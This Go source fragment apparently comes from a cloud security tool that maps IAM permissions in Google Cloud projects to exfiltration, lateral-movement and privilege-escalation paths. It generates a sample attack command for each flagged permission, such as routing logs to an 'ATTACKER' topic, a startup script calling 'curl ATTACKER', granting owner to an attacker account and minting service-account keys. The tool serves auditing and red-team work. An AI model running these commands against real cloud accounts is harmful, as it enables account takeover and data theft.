	} else {
		result.OrgPaths = orgPaths
		result.OrgNames = orgNames
		result.OrgIDs = orgIDs
		result.AllPaths = append(result.AllPaths, orgPaths...)
	}

	// Analyze folder-level IAM
	folderPaths, folderNames, err := s.AnalyzeFolderAttackPaths(ctx, pathType)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze folder attack paths")
	} else {
		result.FolderPaths = folderPaths
		result.FolderNames = folderNames
		result.AllPaths = append(result.AllPaths, folderPaths...)
	}

	// Analyze project-level IAM and resource-level IAM for each project
	for _, projectID := range projectIDs {
		projectName := projectID
		if name, ok := projectNames[projectID]; ok {
			projectName = name
		}

		// Project-level
		projectPathsList, err := s.AnalyzeProjectAttackPaths(ctx, projectID, projectName, pathType)
		if err != nil {
			gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME,
				fmt.Sprintf("Could not analyze attack paths for project %s", projectID))
			continue
		}
		result.ProjectPaths = append(result.ProjectPaths, projectPathsList...)
		result.AllPaths = append(result.AllPaths, projectPathsList...)

		// Resource-level
		resourcePaths, err := s.AnalyzeResourceAttackPaths(ctx, projectID, pathType)
		if err != nil {
			gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME,
				fmt.Sprintf("Could not analyze resource attack paths for project %s", projectID))
			continue
		}
		result.ResourcePaths = append(result.ResourcePaths, resourcePaths...)
		result.AllPaths = append(result.AllPaths, resourcePaths...)
	}

	return result, nil
}

// Helper functions

func (s *AttackPathService) getPermissionMaps(pathType string) (map[string]DataExfilPermission, map[string]LateralMovementPermission, map[string]PrivescPermission) {
	exfilPermMap := make(map[string]DataExfilPermission)
	lateralPermMap := make(map[string]LateralMovementPermission)
	privescPermMap := make(map[string]PrivescPermission)

	if pathType == "exfil" || pathType == "all" {
		for _, p := range GetDataExfilPermissions() {
			exfilPermMap[p.Permission] = p
		}
	}

	if pathType == "lateral" || pathType == "all" {
		for _, p := range GetLateralMovementPermissions() {
			lateralPermMap[p.Permission] = p
		}
	}

	if pathType == "privesc" || pathType == "all" {
		for _, p := range GetPrivescPermissions() {
			privescPermMap[p.Permission] = p
		}
	}

	return exfilPermMap, lateralPermMap, privescPermMap
}

func (s *AttackPathService) getRolePermissions(iamService *iam.Service, role string, projectID string) []string {
	if iamService == nil {
		return []string{}
	}

	ctx := context.Background()
	var roleInfo *iam.Role
	var err error

	if strings.HasPrefix(role, "roles/") {
		roleInfo, err = iamService.Roles.Get(role).Do()
	} else if strings.HasPrefix(role, "projects/") {
		roleInfo, err = iamService.Projects.Roles.Get(role).Do()
	} else if strings.HasPrefix(role, "organizations/") {
		roleInfo, err = iamService.Organizations.Roles.Get(role).Do()
	} else {
		roleInfo, err = iamService.Roles.Get("roles/" + role).Do()
	}

	if err != nil {
		return s.getTestablePermissions(ctx, iamService, role, projectID)
	}

	return roleInfo.IncludedPermissions
}

func (s *AttackPathService) getTestablePermissions(ctx context.Context, iamService *iam.Service, role string, projectID string) []string {
	// Return known permissions for common roles
	knownRoles := map[string][]string{
		"roles/owner": {
			"storage.objects.get", "storage.objects.list", "bigquery.tables.getData",
			"compute.images.create", "compute.snapshots.create", "logging.sinks.create",
			"compute.networks.addPeering", "compute.instances.setMetadata",
		},
		"roles/editor": {
			"storage.objects.get", "storage.objects.list", "bigquery.tables.getData",
			"compute.images.create", "compute.snapshots.create",
			"compute.instances.setMetadata",
		},
		"roles/storage.objectViewer": {
			"storage.objects.get", "storage.objects.list",
		},
		"roles/bigquery.dataViewer": {
			"bigquery.tables.getData",
		},
	}

	if perms, ok := knownRoles[role]; ok {
		return perms
	}
	return []string{}
}

func (s *AttackPathService) analyzePermissionsForAttackPaths(
	member, role string, permissions []string, projectID,
	scopeType, scopeID, scopeName, pathType string,
	exfilPermMap map[string]DataExfilPermission,
	lateralPermMap map[string]LateralMovementPermission,
	privescPermMap map[string]PrivescPermission,
) []AttackPath {
	var paths []AttackPath

	// Skip allUsers/allAuthenticatedUsers for permission-based analysis
	if member == "allUsers" || member == "allAuthenticatedUsers" {
		return paths
	}

	principalType := extractPrincipalType(member)
	principal := extractPrincipalEmail(member)

	// Check for exfil permissions
	for _, perm := range permissions {
		if exfilPerm, ok := exfilPermMap[perm]; ok {
			path := AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         perm,
				TargetResource: scopeName,
				Permissions:    []string{perm},
				Category:       exfilPerm.Category,
				RiskLevel:      exfilPerm.RiskLevel,
				Description:    exfilPerm.Description,
				ExploitCommand: generateExfilCommand(perm, projectID, scopeID),
				ProjectID:      projectID,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "exfil",
			}
			paths = append(paths, path)
		}
	}

	// Check for lateral movement permissions
	for _, perm := range permissions {
		if lateralPerm, ok := lateralPermMap[perm]; ok {
			path := AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         perm,
				TargetResource: scopeName,
				Permissions:    []string{perm},
				Category:       lateralPerm.Category,
				RiskLevel:      lateralPerm.RiskLevel,
				Description:    lateralPerm.Description,
				ExploitCommand: generateLateralCommand(perm, projectID, scopeID),
				ProjectID:      projectID,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "lateral",
			}
			paths = append(paths, path)
		}
	}

	// Check for privesc permissions
	for _, perm := range permissions {
		if privescPerm, ok := privescPermMap[perm]; ok {
			path := AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         perm,
				TargetResource: scopeName,
				Permissions:    []string{perm},
				Category:       privescPerm.Category,
				RiskLevel:      privescPerm.RiskLevel,
				Description:    privescPerm.Description,
				ExploitCommand: generatePrivescCommand(perm, projectID, scopeID),
				ProjectID:      projectID,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "privesc",
			}
			paths = append(paths, path)
		}
	}

	return paths
}

func extractPrincipalType(member string) string {
	if strings.HasPrefix(member, "user:") {
		return "user"
	} else if strings.HasPrefix(member, "serviceAccount:") {
		return "serviceAccount"
	} else if strings.HasPrefix(member, "group:") {
		return "group"
	} else if strings.HasPrefix(member, "domain:") {
		return "domain"
	}
	return "unknown"
}

func extractPrincipalEmail(member string) string {
	parts := strings.SplitN(member, ":", 2)
	if len(parts) == 2 {
		return parts[1]
	}
	return member
}

func generateExfilCommand(permission, projectID, scopeID string) string {
	switch permission {
	case "compute.images.create":
		return fmt.Sprintf("gcloud compute images create exfil-image --source-disk=DISK --source-disk-zone=ZONE --project=%s", projectID)
	case "compute.snapshots.create":
		return fmt.Sprintf("gcloud compute snapshots create exfil-snap --source-disk=DISK --source-disk-zone=ZONE --project=%s", projectID)
	case "logging.sinks.create":
		return fmt.Sprintf("gcloud logging sinks create exfil-sink pubsub.googleapis.com/projects/ATTACKER/topics/logs --project=%s", projectID)
	case "storage.objects.get":
		return fmt.Sprintf("gsutil cp gs://%s/OBJECT ./local --project=%s", scopeID, projectID)
	case "bigquery.tables.getData":
		return fmt.Sprintf("bq query --use_legacy_sql=false 'SELECT * FROM `%s.TABLE`'", scopeID)
	case "secretmanager.versions.access":
		return fmt.Sprintf("gcloud secrets versions access latest --secret=SECRET --project=%s", projectID)
	default:
		return fmt.Sprintf("# %s - refer to GCP documentation", permission)
	}
}

func generateLateralCommand(permission, projectID, scopeID string) string {
	switch permission {
	case "compute.networks.addPeering":
		return fmt.Sprintf("gcloud compute networks peerings create peering --network=NET --peer-network=projects/TARGET/global/networks/NET --project=%s", projectID)
	case "compute.instances.osLogin":
		return fmt.Sprintf("gcloud compute ssh INSTANCE --zone=ZONE --project=%s", projectID)
	case "compute.instances.setMetadata":
		return fmt.Sprintf("gcloud compute instances add-metadata INSTANCE --zone=ZONE --metadata=ssh-keys=\"user:$(cat ~/.ssh/id_rsa.pub)\" --project=%s", projectID)
	case "iam.serviceAccounts.getAccessToken":
		return fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=%s", scopeID)
	case "container.clusters.getCredentials":
		return fmt.Sprintf("gcloud container clusters get-credentials CLUSTER --zone=ZONE --project=%s", projectID)
	default:
		return fmt.Sprintf("# %s - refer to GCP documentation", permission)
	}
}

func generatePrivescCommand(permission, projectID, scopeID string) string {
	switch permission {
	case "iam.serviceAccounts.getAccessToken":
		return fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccountKeys.create":
		return fmt.Sprintf("gcloud iam service-accounts keys create key.json --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccounts.signBlob":
		return fmt.Sprintf("# Sign blob as SA: gcloud iam service-accounts sign-blob --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccounts.signJwt":
		return fmt.Sprintf("# Sign JWT as SA: gcloud iam service-accounts sign-jwt --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "resourcemanager.projects.setIamPolicy":
		return fmt.Sprintf("gcloud projects add-iam-policy-binding %s --member=user:ATTACKER --role=roles/owner", projectID)
	case "resourcemanager.folders.setIamPolicy":
		return fmt.Sprintf("gcloud resource-manager folders add-iam-policy-binding %s --member=user:ATTACKER --role=roles/owner", scopeID)
	case "resourcemanager.organizations.setIamPolicy":
		return fmt.Sprintf("gcloud organizations add-iam-policy-binding %s --member=user:ATTACKER --role=roles/owner", scopeID)
	case "compute.instances.setMetadata":
		return fmt.Sprintf("gcloud compute instances add-metadata INSTANCE --zone=ZONE --metadata=startup-script='#!/bin/bash\\ncurl ATTACKER' --project=%s", projectID)
	case "cloudfunctions.functions.create":
		return fmt.Sprintf("gcloud functions deploy pwn --runtime=python39 --trigger-http --project=%s --service-account=TARGET_SA", projectID)
	case "run.services.create":
		return fmt.Sprintf("gcloud run deploy pwn --image=ATTACKER_IMAGE --project=%s --service-account=TARGET_SA", projectID)
	case "cloudbuild.builds.create":
		return fmt.Sprintf("gcloud builds submit --config=cloudbuild.yaml --project=%s", projectID)
	case "container.pods.exec":
		return fmt.Sprintf("kubectl exec -it POD -- /bin/sh")
	default:
		return fmt.Sprintf("# %s - refer to GCP documentation", permission)
	}
}
